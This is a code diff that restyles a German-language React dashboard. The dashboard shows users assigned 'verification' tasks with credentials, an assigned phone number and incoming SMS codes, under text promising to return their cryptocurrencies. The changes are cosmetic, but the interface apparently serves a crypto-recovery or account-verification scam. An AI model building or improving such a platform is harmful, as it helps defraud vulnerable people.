@@ -479,10 +479,10 @@ export default function Dashboard() {
             <VerificationLogo
               value={selected.verification?.logo_url ?? null}
               alt={selected.verification?.title ?? ""}
-              className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2"
+              className="w-14 h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2"
             />
             <div className="flex-1 min-w-0">
-              <h1 className="text-2xl font-bold text-foreground tracking-tight truncate">
+              <h1 className="font-serif text-2xl sm:text-3xl font-semibold text-[#0b1f3a] tracking-tight truncate">
                 {selected.verification?.title ?? "Auftrag"}
               </h1>
               <div className="mt-1.5">
@@ -505,14 +505,14 @@ export default function Dashboard() {
               if (steps.length === 0) return null;
               return (
                 <div>
-                  <h3 className="text-sm font-medium text-foreground mb-3">Anleitung</h3>
+                  <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Anleitung</h3>
                   <ol className="space-y-3">
                     {steps.map((step, i) => (
                       <li key={i} className="flex gap-3 items-start">
-                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-[#0b1f3a]/10 text-[#0b1f3a] text-xs font-semibold flex items-center justify-center mt-0.5">
+                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-[#0b1f3a] text-white text-xs font-semibold flex items-center justify-center mt-0.5">
                           {i + 1}
                         </span>
-                        <span className="text-sm text-foreground/80 leading-relaxed">{step}</span>
+                        <span className="text-sm text-slate-700 leading-relaxed">{step}</span>
                       </li>
                     ))}
                   </ol>
@@ -538,16 +538,16 @@ export default function Dashboard() {
             {/* Credentials - Ordered */}
             {getOrderedCredentials(selected.field_values).length > 0 && (
               <div>
-                <h3 className="text-sm font-medium text-foreground mb-3">Zugangsdaten</h3>
+                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugangsdaten</h3>
                 <div className="space-y-2">
                   {getOrderedCredentials(selected.field_values).map(([key, value]) => (
                     <div
                       key={key}
-                      className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
+                      className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                     >
                       <div className="min-w-0 flex-1">
-                        <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
-                        <p className="text-sm font-mono font-medium text-foreground truncate">{value}</p>
+                        <p className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">{FIELD_LABELS[key] ?? key}</p>
+                        <p className="text-sm font-mono font-semibold text-[#0b1f3a] truncate">{value}</p>
                       </div>
                       <Button
                         variant="ghost"
@@ -570,11 +570,11 @@ export default function Dashboard() {
             {/* Phone number */}
             {selected.phone_number && (
               <div>
-                <h3 className="text-sm font-medium text-foreground mb-3">Zugewiesene Telefonnummer</h3>
-                <div className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group">
+                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugewiesene Telefonnummer</h3>
+                <div className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group">
                   <div>
                     <p className="text-xs text-muted-foreground">Telefonnummer</p>
-                    <p className="text-sm font-mono font-medium text-foreground">{selected.phone_number}</p>
+                    <p className="text-sm font-mono font-semibold text-[#0b1f3a]">{selected.phone_number}</p>
                   </div>
                   <Button
                     variant="ghost"
@@ -602,7 +602,7 @@ export default function Dashboard() {
                 </div>
                 
                 {smsMessages.length === 0 ? (
-                  <div className="rounded-xl border border-border bg-secondary/30 px-4 py-6 text-center">
+                  <div className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-6 text-center">
                     <p className="text-sm text-muted-foreground">
                       {smsLoading ? "Lade SMS..." : "Noch keine SMS seit Zuweisung eingegangen"}
                     </p>
@@ -612,15 +612,15 @@ export default function Dashboard() {
                     {smsMessages.map((sms, i) => (
                       <div
                         key={`${sms.messageDate}-${i}`}
-                        className="rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
+                        className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                       >
                         <div className="flex items-start justify-between gap-3">
                           <div className="min-w-0 flex-1">
                             <div className="flex items-center gap-2 mb-1">
-                              <span className="text-xs font-medium text-[#0b1f3a]">{sms.messageSender}</span>
-                              <span className="text-xs text-muted-foreground">{formatSmsDate(sms.messageDate)}</span>
+                              <span className="text-xs font-semibold text-[#0b1f3a]">{sms.messageSender}</span>
+                              <span className="text-xs text-slate-500">{formatSmsDate(sms.messageDate)}</span>
                             </div>
-                            <p className="text-sm text-foreground break-words">{sms.messageText}</p>
+                            <p className="text-sm text-slate-700 break-words">{sms.messageText}</p>
                           </div>
                           <Button
                             variant="ghost"
@@ -733,10 +733,10 @@ export default function Dashboard() {
         <main className="max-w-5xl mx-auto w-full px-6">
           {/* Hero */}
           <div className="pt-16 pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
-            <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-foreground">
+            <h1 className="font-serif text-4xl sm:text-5xl font-semibold tracking-tight text-[#0b1f3a]">
               Willkommen zurück
             </h1>
-            <p className="mt-4 text-lg text-muted-foreground max-w-3xl mx-auto leading-relaxed">
+            <p className="mt-4 text-base text-slate-600 max-w-3xl mx-auto leading-relaxed">
               Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
               Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
             </p>
@@ -749,21 +749,21 @@ export default function Dashboard() {
               <Card
                 key={a.id}
                 onClick={() => setSelectedId(a.id)}
-                className="border-border bg-card shadow-none cursor-pointer transition-all duration-200 hover:border-[#0b1f3a]/30 hover:shadow-lg hover:shadow-[#0b1f3a]/10 group"
+                className="border-slate-200 bg-white shadow-sm cursor-pointer transition-all duration-200 hover:border-[#0b1f3a]/40 hover:shadow-md hover:shadow-[#0b1f3a]/10 group"
               >
                 <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-3 px-4">
                   <VerificationLogo
                     value={a.verification?.logo_url ?? null}
                     alt={a.verification?.title ?? ""}
-                    className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2 transition-transform duration-200 group-hover:scale-105"
+                    className="w-14 h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 transition-transform duration-200 group-hover:scale-105"
                     fallback={
-                      <div className="w-14 h-14 rounded-2xl bg-secondary flex items-center justify-center">
+                      <div className="w-14 h-14 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-center">
                         <span className="text-xl font-bold text-muted-foreground">{(a.verification?.title ?? "A").charAt(0)}</span>
                       </div>
                     }
                   />
                   <div className="space-y-1.5">
-                    <p className="text-sm font-semibold text-foreground truncate max-w-full">
+                    <p className="text-sm font-semibold text-[#0b1f3a] truncate max-w-full">
                       {a.verification?.title ?? "Auftrag"}
                     </p>
                     <AssignmentStatusBadge status={a.status} />
@@ -776,10 +776,10 @@ export default function Dashboard() {
             {PLACEHOLDER_CARDS.map((p, i) => (
               <div
                 key={`placeholder-${i}`}
-                className="aspect-square rounded-lg border-2 border-dashed border-border/60 flex flex-col items-center justify-center text-center gap-2 px-4"
+                className="aspect-square rounded-lg border-2 border-dashed border-slate-200 flex flex-col items-center justify-center text-center gap-2 px-4"
               >
-                <Lock className="w-5 h-5 text-muted-foreground/40" />
-                <p className="text-xs font-medium text-muted-foreground/50">
+                <Lock className="w-5 h-5 text-slate-300" />
+                <p className="text-xs font-medium text-slate-400">
                   {p.label}
                 </p>
               </div>
